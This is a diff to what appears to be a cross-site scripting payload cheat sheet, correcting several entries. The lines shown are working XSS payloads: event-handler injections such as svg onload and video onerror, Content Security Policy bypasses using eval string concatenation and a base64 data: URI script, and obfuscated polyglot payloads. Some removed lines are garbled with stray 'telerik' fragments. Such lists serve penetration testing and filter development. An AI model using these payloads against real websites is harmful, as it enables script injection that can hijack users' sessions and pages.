@@ -129,7 +129,7 @@ java%0dscript:alert(1)
 ```html
 <svg/onload=alert('XSS')>
 <details/open/ontoggle="alert(1)">
-<video/poster/onerror=alert(1)>
+<video poster=x onerror=alert(1)>
 <marquee onstart=alert(1)>
 <div onpointerover="alert(1)">hover</div>
 <body ontouchstart=alert(1)>
@@ -163,7 +163,7 @@ oncontentvisibilityautostatechange
 <!-- script-src with unsafe-eval -->
 <script>eval('al'+'ert(1)')</script>
 
--- data: URI allowed -->
+<!-- data: URI allowed -->
 <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
 
 <!-- JSONP endpoint on whitelisted domain -->
@@ -177,11 +177,11 @@ oncontentvisibilityautostatechange
 ## Polyglot Payloads
 
 ```html
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%telerik:telerikfield0telerik:0/telerik;base64,d29telerikybQ==
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ```
 
 ```html
--->'"/></sCript><deTailS open x]oNToggle=(co\u006telerikfirm)``>
+-->'"/></sCript><deTailS open x oNToggle=(co\u006efirm)``>
 ```
 
 ```html
